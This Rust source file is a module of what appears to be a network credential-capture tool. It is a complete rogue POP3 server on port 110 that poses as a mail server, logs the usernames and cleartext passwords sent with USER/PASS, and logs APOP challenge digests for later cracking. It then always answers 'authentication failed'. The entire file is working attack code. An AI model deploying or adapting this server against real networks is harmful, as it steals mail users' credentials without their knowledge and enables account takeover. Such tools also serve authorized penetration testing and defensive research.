//! Rogue POP3 server (TCP 110) capturing cleartext PASS and APOP digests.

use std::net::SocketAddr;
use std::sync::Arc;

use anyhow::Result;
use tokio::io::{AsyncRead, AsyncWrite};
use tokio::net::TcpListener;

use crate::capture::model::{ArtifactType, CaptureArtifact, Protocol};

use super::{ServerContext, read_line, write_str};

pub async fn serve(listener: TcpListener, ctx: Arc<ServerContext>) -> Result<()> {
    loop {
        let (stream, peer) = listener.accept().await?;
        let ctx = ctx.clone();
        tokio::spawn(async move {
            let _ = handle(stream, peer, ctx).await;
        });
    }
}

async fn handle<S: AsyncRead + AsyncWrite + Unpin>(
    mut s: S,
    peer: SocketAddr,
    ctx: Arc<ServerContext>,
) -> Result<()> {
    let challenge = format!(
        "<{}.{}@{}>",
        rand_token(),
        std::process::id(),
        ctx.netbios()
    );
    write_str(&mut s, &format!("+OK POP3 ready {challenge}\r\n")).await?;
    let mut user = String::new();
    while let Some(line) = read_line(&mut s).await {
        let mut parts = line.splitn(2, ' ');
        let cmd = parts.next().unwrap_or("").to_ascii_uppercase();
        let arg = parts.next().unwrap_or("").trim().to_string();
        match cmd.as_str() {
            "USER" => {
                user = arg;
                write_str(&mut s, "+OK\r\n").await?;
            }
            "PASS" => {
                if let Some(art) =
                    CaptureArtifact::cleartext(Protocol::Pop3, peer.ip(), &user, &arg)
                {
                    ctx.sink.artifact(art);
                }
                write_str(&mut s, "-ERR authentication failed\r\n").await?;
            }
            "APOP" => {
                let mut it = arg.splitn(2, ' ');
                let u = it.next().unwrap_or("").to_string();
                let digest = it.next().unwrap_or("").trim().to_string();
                let art = CaptureArtifact::challenge_response(
                    Protocol::Pop3,
                    ArtifactType::Apop,
                    peer.ip(),
                    &u,
                    &digest,
                );
                ctx.sink.artifact(art);
                write_str(&mut s, "-ERR authentication failed\r\n").await?;
            }
            "CAPA" => {
                write_str(
                    &mut s,
                    "+OK Capability list follows\r\nUSER\r\nUIDL\r\n.\r\n",
                )
                .await?;
            }
            "STAT" => write_str(&mut s, "+OK 0 0\r\n").await?,
            "QUIT" => {
                write_str(&mut s, "+OK Bye\r\n").await?;
                break;
            }
            _ => write_str(&mut s, "-ERR unknown command\r\n").await?,
        }
    }
    Ok(())
}

fn rand_token() -> u64 {
    rand::random::<u64>()
}

pub async fn handle_stream<S: AsyncRead + AsyncWrite + Unpin>(
    s: S,
    peer: SocketAddr,
    ctx: Arc<ServerContext>,
) -> Result<()> {
    handle(s, peer, ctx).await
}
